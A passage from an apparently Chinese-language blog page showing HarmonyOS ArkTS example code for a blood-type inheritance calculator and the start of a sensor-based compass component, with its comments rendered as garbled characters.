&#123;</span><br><span class="line">        bloodTypes.<span class="title function_">push</span>(<span class="string">&#x27;O&#x27;</span>); <span class="comment">// åŸºå› ç»„åˆä¸ºOOæ—¶ï¼Œè¡€å‹ä¸ºO</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å»é™¤é‡å¤çš„è¡€å‹</span></span><br><span class="line">    <span class="keyword">return</span> bloodTypes.<span class="title function_">filter</span>(<span class="function">(<span class="params">value, index, self</span>) =&gt;</span> self.<span class="title function_">indexOf</span>(value) === index);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// è®¡ç®—å­©å­å¯èƒ½çš„è¡€å‹åŠä¸å¯èƒ½çš„è¡€å‹</span></span><br><span class="line">  <span class="title function_">calculatePossibleBloodTypes</span>(<span class="params">father: string, mother: string</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> fatherGenes = <span class="variable language_">this</span>.<span class="title function_">getGenes</span>(father); <span class="comment">// è·å–çˆ¶äº²çš„åŸºå› ç»„åˆ</span></span><br><span class="line">    <span class="keyword">const</span> motherGenes = <span class="variable language_">this</span>.<span class="title function_">getGenes</span>(mother); <span class="comment">// è·å–æ¯äº²çš„åŸºå› ç»„åˆ</span></span><br><span class="line">    <span class="keyword">const</span> possibleGenes = <span class="variable language_">this</span>.<span class="title function_">combineGenes</span>(fatherGenes, motherGenes); <span class="comment">// ç»„åˆçˆ¶æ¯çš„åŸºå› </span></span><br><span class="line">    <span class="keyword">const</span> possibleBloodTypes = <span class="variable language_">this</span>.<span class="title function_">getBloodTypesFromGenes</span>(possibleGenes); <span class="comment">// ä»åŸºå› ç»„åˆä¸­è·å–å¯èƒ½çš„è¡€å‹</span></span><br><span class="line">    <span class="keyword">const</span> <span class="attr">allBloodTypes</span>: string[] = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;AB&#x27;</span>, <span class="string">&#x27;O&#x27;</span>]; <span class="comment">// æ‰€æœ‰å¯èƒ½çš„è¡€å‹åˆ—è¡¨</span></span><br><span class="line">    <span class="keyword">const</span> impossibleBloodTypes = allBloodTypes.<span class="title function_">filter</span>(<span class="function"><span class="params">bt</span> =&gt;</span> !possibleBloodTypes.<span class="title function_">includes</span>(bt)); <span class="comment">// è®¡ç®—ä¸å¯èƒ½çš„è¡€å‹</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">possibleBloodTypesText</span> = <span class="string">`å­©å­å¯èƒ½è¡€å‹ï¼š<span class="subst">$&#123;possibleBloodTypes.join(<span class="string">&#x27;ã€&#x27;</span>)&#125;</span>`</span>); <span class="comment">// æ˜¾ç¤ºå¯èƒ½çš„è¡€å‹</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">impossibleBloodTypesText</span> = <span class="string">`å­©å­ä¸å¯èƒ½è¡€å‹ï¼š<span class="subst">$&#123;impossibleBloodTypes.join(<span class="string">&#x27;ã€&#x27;</span>)&#125;</span>`</span>); <span class="comment">// æ˜¾ç¤ºä¸å¯èƒ½çš„è¡€å‹</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// å½“èƒ¶å›ŠæŒ‰é’®çš„é€‰æ‹©å‘ç”Ÿå˜åŒ–æ—¶è°ƒç”¨æ­¤å‡½æ•°</span></span><br><span class="line">  <span class="title function_">capsuleSelectedIndexesChanged</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">father</span>: string = <span class="variable language_">this</span>.<span class="property">bloodTypeList</span>[<span class="variable language_">this</span>.<span class="property">fatherBloodTypeIndex</span>[<span class="number">0</span>]][<span class="string">&#x27;text&#x27;</span>]; <span class="comment">// è·å–çˆ¶äº²é€‰æ‹©çš„è¡€å‹</span></span><br><span class="line">    <span class="keyword">let</span> <span class="attr">mother</span>: string = <span class="variable language_">this</span>.<span class="property">bloodTypeList</span>[<span class="variable language_">this</span>.<span class="property">motherBloodTypeIndex</span>[<span class="number">0</span>]][<span class="string">&#x27;text&#x27;</span>]; <span class="comment">// è·å–æ¯äº²é€‰æ‹©çš„è¡€å‹</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">calculatePossibleBloodTypes</span>(father, mother); <span class="comment">// è®¡ç®—å¹¶æ›´æ–°è¡€å‹ä¿¡æ¯</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// åœ¨ç»„ä»¶å³å°†å‡ºç°æ—¶è°ƒç”¨æ­¤å‡½æ•°</span></span><br><span class="line">  <span class="title function_">aboutToAppear</span>(): <span class="keyword">void</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">singleSelectCapsuleOptions</span> = <span class="title class_">SegmentButtonOptions</span>.<span class="title function_">capsule</span>(&#123;</span><br><span class="line">      <span class="attr">buttons</span>: <span class="variable language_">this</span>.<span class="property">bloodTypeList</span> <span class="keyword">as</span> <span class="title class_">SegmentButtonItemTuple</span>, <span class="comment">// è®¾ç½®èƒ¶å›ŠæŒ‰é’®çš„é€‰é¡¹</span></span><br><span class="line">      <span class="attr">multiply</span>: <span class="literal">false</span>, <span class="comment">// å•é€‰æ¨¡å¼</span></span><br><span class="line">      <span class="attr">fontColor</span>: <span class="title class_">Color</span>.<span class="property">White</span>, <span class="comment">// å­—ä½“é¢œè‰²ä¸ºç™½è‰²</span></span><br><span class="line">      <span class="attr">selectedFontColor</span>: <span class="title class_">Color</span>.<span class="property">White</span>, <span class="comment">// é€‰ä¸­æ—¶å­—ä½“é¢œè‰²ä¸ºç™½è‰²</span></span><br><span class="line">      <span class="attr">selectedBackgroundColor</span>: <span class="variable language_">this</span>.<span class="property">themeColor</span>, <span class="comment">// é€‰ä¸­èƒŒæ™¯è‰²ä¸ºä¸»é¢˜è‰²</span></span><br><span class="line">      <span class="attr">backgroundColor</span>: <span class="variable language_">this</span>.<span class="property">lineColor</span>, <span class="comment">// èƒŒæ™¯è‰²ä¸ºè¾¹æ¡†é¢œè‰²</span></span><br><span class="line">      <span class="attr">backgroundBlurStyle</span>: <span class="title class_">BlurStyle</span>.<span class="property">BACKGROUND_THICK</span> <span class="comment">// èƒŒæ™¯æ¨¡ç³Šæ•ˆæœ</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">capsuleSelectedIndexesChanged</span>(); <span class="comment">// åˆå§‹åŒ–æ—¶è°ƒç”¨é€‰æ‹©å˜åŒ–å¤„ç†å‡½æ•°</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ„å»ºç”¨æˆ·ç•Œé¢</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>() &#123;</span><br><span class="line">      <span class="comment">// é¡µé¢æ ‡é¢˜</span></span><br><span class="line">      <span class="title class_">Text</span>(<span class="string">&#x27;è¡€å‹é—ä¼ è®¡ç®—&#x27;</span>)</span><br><span class="line">        .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>) <span class="comment">// æ–‡æœ¬é¢œè‰²</span></span><br><span class="line">        .<span class="title function_">fontSize</span>(<span class="number">18</span>) <span class="comment">// å­—ä½“å¤§å°</span></span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// å®½åº¦ä¸º100%</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="number">50</span>) <span class="comment">// é«˜åº¦ä¸º50</span></span><br><span class="line">        .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>) <span class="comment">// æ–‡æœ¬å±…ä¸­å¯¹é½</span></span><br><span class="line">        .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>) <span class="comment">// èƒŒæ™¯è‰²ä¸ºç™½è‰²</span></span><br><span class="line">        .<span class="title function_">shadow</span>(&#123; <span class="comment">// æ·»åŠ é˜´å½±æ•ˆæœ</span></span><br><span class="line">          <span class="attr">radius</span>: <span class="number">2</span>, <span class="comment">// é˜´å½±åŠå¾„</span></span><br><span class="line">          <span class="attr">color</span>: <span class="variable language_">this</span>.<span class="property">lineColor</span>, <span class="comment">// é˜´å½±é¢œè‰²</span></span><br><span class="line">          <span class="attr">offsetX</span>: <span class="number">0</span>, <span class="comment">// æ°´å¹³åç§»é‡</span></span><br><span class="line">          <span class="attr">offsetY</span>: <span class="number">5</span> <span class="comment">// å‚ç›´åç§»é‡</span></span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// å·¥å…·ä»‹ç»éƒ¨åˆ†</span></span><br><span class="line">      <span class="title class_">Column</span>() &#123;</span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">&#x27;å·¥å…·ä»‹ç»&#x27;</span>).<span class="title function_">fontSize</span>(<span class="number">20</span>).<span class="title function_">fontWeight</span>(<span class="number">600</span>).<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>);</span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">&#x27;è¡€å‹æ˜¯ä»¥Aã€Bã€Oä¸‰ç§é—ä¼ å› å­çš„ç»„åˆè€Œå†³å®šçš„ï¼Œæ ¹æ®çˆ¶æ¯çš„è¡€å‹ï¼Œå°±å¯ä»¥åˆ¤æ–­å‡ºä»¥åå‡ºç”Ÿçš„å­©å­çš„è¡€å‹ã€‚&#x27;</span>)</span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="number">18</span>).<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>).<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding / <span class="number">2</span>&#125;</span>lpx`</span> &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">alignItems</span>(<span class="title class_">HorizontalAlign</span>.<span class="property">Start</span>)</span><br><span class="line">      .<span class="title function_">width</span>(<span class="string">&#x27;650lpx&#x27;</span>)</span><br><span class="line">      .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span>)</span><br><span class="line">      .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span> &#125;)</span><br><span class="line">      .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">      .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">      .<span class="title function_">shadow</span>(&#123;</span><br><span class="line">        <span class="attr">radius</span>: <span class="number">10</span>,</span><br><span class="line">        <span class="attr">color</span>: <span class="variable language_">this</span>.<span class="property">lineColor</span>,</span><br><span class="line">        <span class="attr">offsetX</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">offsetY</span>: <span class="number">0</span></span><br><span class="line">      &#125;);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// çˆ¶äº²è¡€å‹é€‰æ‹©éƒ¨åˆ†</span></span><br><span class="line">      <span class="title class_">Column</span>() &#123;</span><br><span class="line">        <span class="title class_">Row</span>() &#123;</span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">&#x27;çˆ¶äº²è¡€å‹&#x27;</span>).<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>).<span class="title function_">fontSize</span>(<span class="number">18</span>);</span><br><span class="line">          <span class="title class_">SegmentButton</span>(&#123;</span><br><span class="line">            <span class="attr">options</span>: <span class="variable language_">this</span>.<span class="property">singleSelectCapsuleOptions</span>, <span class="comment">// èƒ¶å›ŠæŒ‰é’®çš„é…ç½®é¡¹</span></span><br><span class="line">            <span class="attr">selectedIndexes</span>: <span class="variable language_">this</span>.<span class="property">fatherBloodTypeIndex</span> <span class="comment">// å½“å‰é€‰ä¸­çš„ç´¢å¼•</span></span><br><span class="line">          &#125;).<span class="title function_">width</span>(<span class="string">&#x27;400lpx&#x27;</span>);</span><br><span class="line">        &#125;.<span class="title function_">height</span>(<span class="number">45</span>).<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">SpaceBetween</span>).<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// æ¯äº²è¡€å‹é€‰æ‹©éƒ¨åˆ†</span></span><br><span class="line">        <span class="title class_">Row</span>() &#123;</span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">&#x27;æ¯äº²è¡€å‹&#x27;</span>).<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>).<span class="title function_">fontSize</span>(<span class="number">18</span>);</span><br><span class="line">          <span class="title class_">SegmentButton</span>(&#123;</span><br><span class="line">            <span class="attr">options</span>: <span class="variable language_">this</span>.<span class="property">singleSelectCapsuleOptions</span>, <span class="comment">// èƒ¶å›ŠæŒ‰é’®çš„é…ç½®é¡¹</span></span><br><span class="line">            <span class="attr">selectedIndexes</span>: <span class="variable language_">this</span>.<span class="property">motherBloodTypeIndex</span> <span class="comment">// å½“å‰é€‰ä¸­çš„ç´¢å¼•</span></span><br><span class="line">          &#125;).<span class="title function_">width</span>(<span class="string">&#x27;400lpx&#x27;</span>);</span><br><span class="line">        &#125;.<span class="title function_">height</span>(<span class="number">45</span>).<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">SpaceBetween</span>).<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">alignItems</span>(<span class="title class_">HorizontalAlign</span>.<span class="property">Start</span>)</span><br><span class="line">      .<span class="title function_">width</span>(<span class="string">&#x27;650lpx&#x27;</span>)</span><br><span class="line">      .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span>)</span><br><span class="line">      .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span> &#125;)</span><br><span class="line">      .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">      .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">      .<span class="title function_">shadow</span>(&#123;</span><br><span class="line">        <span class="attr">radius</span>: <span class="number">10</span>,</span><br><span class="line">        <span class="attr">color</span>: <span class="variable language_">this</span>.<span class="property">lineColor</span>,</span><br><span class="line">        <span class="attr">offsetX</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">offsetY</span>: <span class="number">0</span></span><br><span class="line">      &#125;);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// æ˜¾ç¤ºè®¡ç®—ç»“æœ</span></span><br><span class="line">      <span class="title class_">Column</span>() &#123;</span><br><span class="line">        <span class="title class_">Row</span>() &#123;</span><br><span class="line">          <span class="title class_">Text</span>(<span class="variable language_">this</span>.<span class="property">possibleBloodTypesText</span>).<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>).<span class="title function_">fontSize</span>(<span class="number">18</span>);</span><br><span class="line">        &#125;.<span class="title function_">height</span>(<span class="number">45</span>).<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">SpaceBetween</span>).<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>);</span><br><span class="line">        <span class="title class_">Row</span>() &#123;</span><br><span class="line">          <span class="title class_">Text</span>(<span class="variable language_">this</span>.<span class="property">impossibleBloodTypesText</span>).<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>).<span class="title function_">fontSize</span>(<span class="number">18</span>);</span><br><span class="line">        &#125;.<span class="title function_">height</span>(<span class="number">45</span>).<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">SpaceBetween</span>).<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">alignItems</span>(<span class="title class_">HorizontalAlign</span>.<span class="property">Start</span>)</span><br><span class="line">      .<span class="title function_">width</span>(<span class="string">&#x27;650lpx&#x27;</span>)</span><br><span class="line">      .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span>)</span><br><span class="line">      .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span> &#125;)</span><br><span class="line">      .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">      .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">      .<span class="title function_">shadow</span>(&#123;</span><br><span class="line">        <span class="attr">radius</span>: <span class="number">10</span>,</span><br><span class="line">        <span class="attr">color</span>: <span class="variable language_">this</span>.<span class="property">lineColor</span>,</span><br><span class="line">        <span class="attr">offsetX</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">offsetY</span>: <span class="number">0</span></span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#f4f8fb&quot;</span>); <span class="comment">// é¡µé¢èƒŒæ™¯è‰²</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="compass"><a href="#compass" class="headerlink" title="compass"></a>compass</h1><p>æŒ‡å—é’ˆ</p><p>ä¼ æ„Ÿå™¨ è§’åº¦è®¡ç®—</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; sensor &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.SensorServiceKit&#x27;</span>; <span class="comment">// å¯¼å…¥ä¼ æ„Ÿå™¨æœåŠ¡æ¨¡å—</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">BusinessError</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.BasicServicesKit&#x27;</span>; <span class="comment">// å¯¼å…¥ä¸šåŠ¡é”™è¯¯å¤„ç†æ¨¡å—</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// å®šä¹‰æ–¹å‘èŒƒå›´ç±»</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DirectionRange</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: string = <span class="string">&#x27;&#x27;</span>; <span class="comment">// æ–¹å‘åç§°</span></span><br><span class="line">  <span class="attr">min</span>: number = <span class="number">0</span>; <span class="comment">// æœ€å°è§’åº¦</span></span><br><span class="line">  <span class="attr">max</span>: number = <span class="number">0</span>; <span class="comment">// æœ€å¤§è§’åº¦</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// å®šä¹‰å„ä¸ªæ–¹å‘çš„èŒƒå›´</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">DIRECTION_RANGES</span>: <span class="title class_">DirectionRange</span>[] = [</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&#x27;åŒ—&#x27;</span>, <span class="attr">min</span>: <span class="number">337.5</span>, <span class="attr">max</span>: <span class="number">360</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&#x27;åŒ—&#x27;</span>, <span class="attr">min</span>: <span class="number">0</span>, <span class="attr">max</span>: <span class="number">22.5</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&#x27;ä¸œåŒ—&#x27;</span>, <span class="attr">min</span>: <span class="number">22.5</span>, <span class="attr">max</span>: <span class="number">67.5</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&#x27;ä¸œ&#x27;</span>, <span class="attr">min</span>: <span class="number">67.5</span>, <span class="attr">max</span>: <span class="number">112.5</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&#x27;ä¸œå—&#x27;</span>, <span class="attr">min</span>: <span class="number">112.5</span>, <span class="attr">max</span>: <span class="number">157.5</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&#x27;å—&#x27;</span>, <span class="attr">min</span>: <span class="number">157.5</span>, <span class="attr">max</span>: <span class="number">202.5</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&#x27;è¥¿å—&#x27;</span>, <span class="attr">min</span>: <span class="number">202.5</span>, <span class="attr">max</span>: <span class="number">247.5</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&#x27;è¥¿&#x27;</span>, <span class="attr">min</span>: <span class="number">247.5</span>, <span class="attr">max</span>: <span class="number">292.5</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">name</span>: <span class="string">&#x27;è¥¿åŒ—&#x27;</span>, <span class="attr">min</span>: <span class="number">292.5</span>, <span class="attr">max</span>: <span class="number">337.5</span> &#125;</span><br><span class="line">];</span><br><span class="line"> </span><br><span class="line"><span class="comment">// å®šä¹‰æŒ‡å—é’ˆç»„ä»¶</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">Compass</span> &#123;</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">directionMessage</span>: string = <span class="string">&#x27;&#x27;</span>; <span class="comment">// å½“å‰æ–¹å‘çš„åç§°</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">rotationAngle</span>: number = <span class="number">0</span>; <span class="comment">// å½“å‰æ—‹è½¬è§’åº¦</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">currentAngle</span>: number = <span class="number">0</span>; <span class="comment">// å½“å‰ä¼ æ„Ÿå™¨è§’åº¦</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">cumulativeRotation</span>: number = <span class="number">0</span>; <span class="comment">// ç´¯è®¡æ—‹è½¬è§’åº¦</span></span><br><span class="line">  private <span class="attr">threshold</span>: number = <span class="number">1</span>; <span class="comment">// è®¾ç½®é˜ˆå€¼ï¼Œç”¨äºè¿‡æ»¤å°çš„æ—‹è½¬å˜åŒ–</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// ç»„ä»¶å³å°†å‡ºç°æ—¶è°ƒç”¨</span></span><br><span class="line">  <span class="title function_">aboutToAppear</span>(): <span class="keyword">void</span> &#123;</span><br><span class="line">    sensor.<span class="title function_">getSensorList</span>(<span class="function">(<span class="params">error: BusinessError</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (error) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;è·å–ä¼ æ„Ÿå™¨åˆ—è¡¨å¤±è´¥&#x27;</span>, error); <span class="comment">// å¦‚æœè·å–ä¼ æ„Ÿå™¨åˆ—è¡¨å¤±è´¥ï¼Œæ‰“å°é”™è¯¯ä¿¡æ¯</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">startOrientationUpdates</span>(); <span class="comment">// å¼€å§‹ç›‘å¬ä¼ æ„Ÿå™¨æ•°æ®</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// å¼€å§‹ç›‘å¬ä¼ æ„Ÿå™¨çš„æ–¹ä½æ•°æ®</span></span><br><span class="line">  private <span class="title function_">startOrientationUpdates</span>(): <span class="keyword">void</span> &#123;</span><br><span class="line">    sensor.<span class="title function_">on</span>(sensor.<span class="property">SensorId</span>.<span class="property">ORIENTATION</span>, <span class="function">(<span class="params">orientationData</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> alpha = orientationData.<span class="property">alpha</span>; <span class="comment">// è·å–å½“å‰çš„æ–¹ä½è§’</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">directionMessage</span> = <span class="variable language_">this</span>.<span class="title function_">calculateDirection</span>(alpha); <span class="comment">// è®¡ç®—å½“å‰æ–¹å‘</span></span><br><span class="line">      <span class="keyword">const</span> angleDifference = <span class="variable language_">this</span>.<span class="title function_">calculateAngleDifference</span>(<span class="variable language_">this</span>.<span class="property">currentAngle</span>, alpha); <span class="comment">// è®¡ç®—è§’åº¦å·®</span></span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span> (<span class="title class_">Math</span>.<span class="title function_">abs</span>(angleDifference) &gt; <span class="variable language_">this</span>.<span class="property">threshold</span>) &#123; <span class="comment">// å¦‚æœè§’åº¦å˜åŒ–è¶…è¿‡é˜ˆå€¼</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">updateRotationAngle</span>(angleDifference, alpha); <span class="comment">// æ›´æ–°æ—‹è½¬è§’åº¦</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, &#123; <span class="attr">interval</span>: <span class="number">10000000</span> &#125;); <span class="comment">// è®¾ç½®ä¼ æ„Ÿå™¨æ›´æ–°é—´éš”ï¼Œå•ä½ä¸ºçº³ç§’ï¼Œ10000000è¡¨ç¤º1ç§’</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 